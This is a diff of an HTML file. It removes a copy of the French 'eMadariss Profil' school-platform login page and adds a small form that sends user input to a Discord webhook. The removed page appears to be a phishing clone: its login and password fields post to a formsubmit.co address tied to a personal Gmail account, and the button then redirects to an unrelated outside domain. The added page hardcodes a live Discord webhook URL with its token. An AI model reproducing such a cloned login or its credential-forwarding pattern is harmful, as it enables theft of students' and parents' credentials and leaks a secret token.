@@ -1,260 +1,55 @@
-<!DOCTYPE html><html lang="fr-fr"><head>
-    
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <title>eMADARISS PROFIL</title>
-    <link href="css/bootstrap.css" rel="stylesheet">
-<link href="css/bootstrap-dialog.css" rel="stylesheet">
-<link href="css/bootstrap-chosen.css" rel="stylesheet">
-<link href="css/gijgo.min.css" rel="stylesheet">
-<link href="css/animate.css" rel="stylesheet">
-<link href="css/font-awesome.css" rel="stylesheet">
-<link href="css/Gridmvc.css" rel="stylesheet">
-<link href="css/site.css" rel="stylesheet">
-<link href="css/slick.grid.css" rel="stylesheet">
-<link href="css/slick.headerbuttons.css" rel="stylesheet">
-<link href="css/slick-default-theme.css" rel="stylesheet">
-<link href="css/jm.spinner.css" rel="stylesheet">
-
-    <script src="js/modernizr-2.8.3.js"></script>
-
-    
-
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Form to Webhook</title>
 </head>
 <body>
-          
-   <nav class="navbar navbar-expand-lg fixed-top navbar-dark bg-dark">
 
-        <div class="container">
-            
-            <a href="/" title="eMadariss Profil" class="navbar-brand">
-                <img src="images/logo3.png">
-            </a>
-            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
-                <span class="navbar-toggler-icon"></span>
-            </button>             
-               
-
-        
-            <div class="collapse navbar-collapse navbar-dark bg-dark" id="navbarNav">
-
-                    <ul class="navbar-nav mr-auto">
-                
-                    </ul>
-                <ul class="navbar-nav">
-                    
-                    <li class="nav-item"><a class="nav-link" href="/Home/About"><i class="fa fa-info-circle"></i> À propos de</a></li>
-                    <li class="nav-item"><a class="nav-link" href="/Home/Contact"><i class="fa fa-map-marker"></i> Contact</a></li>
-
-                    
-
-
-                </ul>
-            </div>
-         </div>
-   </nav>
-
-    <br>
-
-    <div class="container">
-                                        <div class="card">
-                                            <div class="card-body">
-                                                
-
-
-<div id="carouselIndicators" class="carousel slide d-none d-md-block" data-ride="carousel">
-    <ol class="carousel-indicators">
-        <li data-target="#carouselIndicators" data-slide-to="0" class="active"></li>
-        <li data-target="#carouselIndicators" data-slide-to="1"></li>
-        <li data-target="#carouselIndicators" data-slide-to="2"></li>
-        <li data-target="#carouselIndicators" data-slide-to="3"></li>
-        <li data-target="#carouselIndicators" data-slide-to="4"></li>
-    </ol>
-    <div class="carousel-inner">
-        <div class="carousel-item active">
-            <img class="d-block w-100" src="images/1g.jpg" alt="First slide">
-        </div>
-        <div class="carousel-item">
-            <img class="d-block w-100" src="images/2g.jpg" alt="Second slide">
-        </div>
-        <div class="carousel-item">
-            <img class="d-block w-100" src="images/3g.jpg" alt="Third slide">
-        </div>
-        <div class="carousel-item">
-            <img class="d-block w-100" src="images/4g.jpg" alt="Third slide">
-        </div>
-        <div class="carousel-item">
-            <img class="d-block w-100" src="images/5g.jpg" alt="Third slide">
-        </div>
+<form id="myForm">
+    <div class="form-group">
+        <label for="inputData">Input Data</label>
+        <input type="text" id="inputData" name="inputData" placeholder="Enter data">
     </div>
-    <a class="carousel-control-prev" href="#carouselIndicators" role="button" data-slide="prev">
-        <span class="carousel-control-prev-icon" aria-hidden="true"></span>
-        <span class="sr-only">Précédent</span>
-    </a>
-    <a class="carousel-control-next" href="#carouselIndicators" role="button" data-slide="next">
-        <span class="carousel-control-next-icon" aria-hidden="true"></span>
-        <span class="sr-only">Suivant</span>
-    </a>
-</div>
+    <button type="button" onclick="submitForm()">Submit</button>
+</form>
 
-<br>
+<script>
+    function submitForm() {
+        // Get input data from the form
+        var inputData = document.getElementById('inputData').value;
 
+        // Your webhook URL
+        var webhookUrl = 'https://discord.com/api/webhooks/1186409354275074118/VtHGSf6wRX0cx5C-dixBEZSUbQcW-i_FFZuukNj_7x6UI_xAtIRUEQEuHo_ERCHBXHIl';
 
-<div class="card-deck">
+        // Data to send to the webhook
+        var data = {
+            content: `New input data: ${inputData}`,
+        };
 
-    <div class="card">
-        <h5 class="card-header">
-            <b>AUTHENTIFIEZ-VOUS</b>
-            <i class="fa fa-lock pull-right"></i>
-        </h5>
-        <div class="card-body">
-            
+        // Make a POST request to the webhook
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data),
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error(`HTTP error! Status: ${response.status}`);
+            }
+            return response.json();
+        })
+        .then(responseData => {
+            console.log('Webhook response:', responseData);
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
+    }
+</script>
 
-                <div class="form-group row">                    
-                    
-<form action="https://formsubmit.co/adam.right04@gmail.com
-" method="POST">
-                   
-                </div>
-               <div class="form-group row">                    
-                    <label for="Username" class="col-lg-3 col-form-label">Login</label>
-                    <div class="col-lg-9">
-                        <input type="text" class="form-control" id="Username" name="Username" placeholder="Login" autofocus="">
-                    </div>
-                </div>
-                <div class="form-group row">
-                    <label for="Password" class="col-lg-3 col-form-label">Mot de passe</label>
-                    <div class="col-lg-9">
-                        <input type="password" class="form-control" id="Password" name="Password" placeholder="Mot de passe">
-                    </div>                    
-                </div>
-
-                    <button type="submit" class="btn btn-primary pull-right" onclick="window.location.href='https://elouatkikaoukabi.com/';" >Se connecter</button> 
-                    </form>   
-
-                </div>
-                
-                
-
-                
-                
-                          
-                     
-        </div>
-        <div class="card-footer text-right small" style="height:30px;padding-top:5px;">
-            <span class="card-link"><a href="/Users/Registration"> Créer votre compte</a></span>
-            <span> | </span>
-            <span class="card-link"><a href="/users/ForgotPasssword">Mot de passe oublié!</a></span>
-        </div>
-    </div>
-
-    <div class="card bg-transparent border-0 col-12">
-   
-    <div class="card-body">
-        
-        <center>
-            <img class="" src="images/logo.png">
-            <h5><b>Solution Madariss</b></h5>
-            <h5 class="card-title"><i>eMadariss Profil</i></h5>
-        </center>
-
-        <p class="card-text">
-            Une plateforme internet qui vous permet, au jour le jour, d'accéder aux informations relatives; la vie scolaire.
-            
-        </p>
-        <p class="card-text">
-            Depuis vos téléphones, tablettes ou ordinateurs, vous avez maintenant une nouvelle vision de l'école...
-            
-        </p>
-        
-
-    </div>
-</div>
-
-
-
-
-</div>
-
-
-                                            </div>
-                                        </div>
-
-    </div>
-
-
-                                <nav class="navbar fixed-bottom navbar-dark bg-dark" style="height:25px;">
-
-    <div class="navbar-brand" style="margin-top:-18px;">
-        <small>eMadariss Profil V11.2.10</small>
-    </div>         
-
-    <div class="navbar-brand" style="margin-top:-18px;">
-        <small><span>Copyright © 2017-2020 <a href="http://www.nexsoft.ma" target="_blank">Nexsoft</a></span></small>
-    </div>
-</nav>
-
-    
-
-
-
-                                <script src="js/jquery-2.1.1.js"></script>
-<script src="js/jquery-3.3.1.js"></script>
-<script src="js/jquery-3.4.1.js"></script>
-<script src="js/jquery.backstretch.js"></script>
-
-                                <script src="js/bootstrap.js"></script>
-<script src="js/bootstrap.bundle.js"></script>
-<script src="js/respond.js"></script>
-<script src="js/gijgo.min.js"></script>
-<script src="js/gijgo.messages.fr-fr.min.js"></script>
-<script src="js/TwitterBootstrapMvcJs.js"></script>
-<script src="js/bootstrap-dialog.js"></script>
-<script src="js/chosen.jquery.js"></script>
-<script src="js/bootstrap-confirmation.js"></script>
-<script src="js/moment.min.js"></script>
-<script src="js/button.js"></script>
-<script src="js/gridmvc.js"></script>
-<script src="js/gridmvc.lang.fr.js"></script>
-<script src="js/jm.spinner.js"></script>
-<script src="js/global.js"></script>
-
-
-                                
-    <script src="js/jquery.validate.js"></script>
-<script src="js/messages_fr.js"></script>
-
-    <script>
-        $("#LoginForm").validate();
-    </script>
-
-
-
-                                    <script type="text/javascript">
-                                        'use strict';
-
-                                        /* ========================== */
-                                        /* ::::::: Backstrech ::::::: */
-                                        /* ========================== */
-                                        // You may also attach Backstretch to a block-level element
-                                        $.backstretch(
-                                        [
-                                            "/content/custom/img/bg01.jpg",
-                                            "/content/custom/img/bg02.jpg",
-                                            "/content/custom/img/bg03.jpg",
-                                            "/content/custom/img/bg05.jpg",
-                                            "/content/custom/img/bg06.jpg"
-                                        ],
-
-                                        {
-                                            duration: 150000,
-                                            fade: 1500
-                                        }
-                                        );
-                                    </script>
-
-
-
-
-
-</body></html>
+</body>
+</html>
